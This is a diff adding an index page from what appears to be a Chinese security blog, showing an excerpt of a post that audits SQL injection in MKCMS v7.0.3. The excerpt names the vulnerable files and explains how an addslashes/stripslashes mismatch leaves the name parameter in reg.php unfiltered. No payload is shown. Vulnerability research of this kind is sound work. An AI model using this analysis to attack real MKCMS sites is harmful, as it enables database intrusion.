+        <a data-url="https://she11c0de.github.io/2022/07/07/MobileIron/%EF%BC%88CVE-2020-15505%EF%BC%89MobileIron%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsan00bjy8v1cddd44gh" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-MKCMS/MKCMS v7.0.3 sql注入漏洞审计" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MKCMS/MKCMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.473Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MKCMS-v7-0-3-sql注入漏洞审计"><a href="#MKCMS-v7-0-3-sql注入漏洞审计" class="headerlink" title="MKCMS v7.0.3 sql注入漏洞审计"></a>MKCMS v7.0.3 sql注入漏洞审计</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。<br>米酷CMS v7.0.3版本<code>admin/model/admin_edit.php</code>、<code>ucenter/reg.php</code>等文件存在漏洞，攻击者可以利用漏洞进行<code>sql</code>注入攻击。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>米酷CMS v7.0.3</p>
+<h2 id="第一处注入"><a href="#第一处注入" class="headerlink" title="第一处注入"></a>第一处注入</h2><ul>
+<li>  <strong>漏洞文件</strong></li>
+</ul>
+<p><code>ucenter/reg.php</code> （前台文件）</p>
+<ul>
+<li><p><strong>分析</strong><br>  在reg.php这个文件中，第9行处对<code>$username</code>这个参数进行了查询拼接，<br>  ![](/resource/米酷CMS v7.0.3 sql注入漏洞审计/media/2020122409471580.png)</p>
+<p>  但是在第7行处，<code>$username</code>的值是来自于<code>POST</code>传递的<code>name</code>参数，当<code>name</code>参数到达<code>reg.php</code>这个文件之后，<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除“<code>\</code>”处理，<br>  ![](/resource/米酷CMS v7.0.3 sql注入漏洞审计/media/20201224094850911.png)<br>根据<code>include</code>，跳转到<code>/system/library.php</code>中，我们可以发现这里系统对<code>GET</code>、<code>POST</code>等参数进行了<code>addslashes_deep（）</code>函数处理，即对参数传递时加上了一个“<code>\</code>”，<br>  ![](/resource/米酷CMS v7.0.3 sql注入漏洞审计/media/20201224094931786.png)<br>  问题就出在这里，前端用户进行提交的<code>name</code>参数，经过了<code>addslashes_deep（）</code>函数处理加上了一个“<code>\</code>”，到达<code>reg.php</code>页面又使用<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除“<code>\</code>”处理，这就导致出现了无过滤拼接。</p>
+</li>
+</ul>
+<h2 id="第二处注入"><a href="#第二处注入" class="headerlink" title="第二处注入"></a>第二处注入</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/MKCMS/MKCMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MKCMS/MKCMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" data-id="cl5c2qsao00bky8v1asgrfflg" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/59/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="page-number" href="/page/59/">59</a><span class="page-number current">60</span><a class="page-number" href="/page/61/">61</a><a class="page-number" href="/page/62/">62</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/61/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
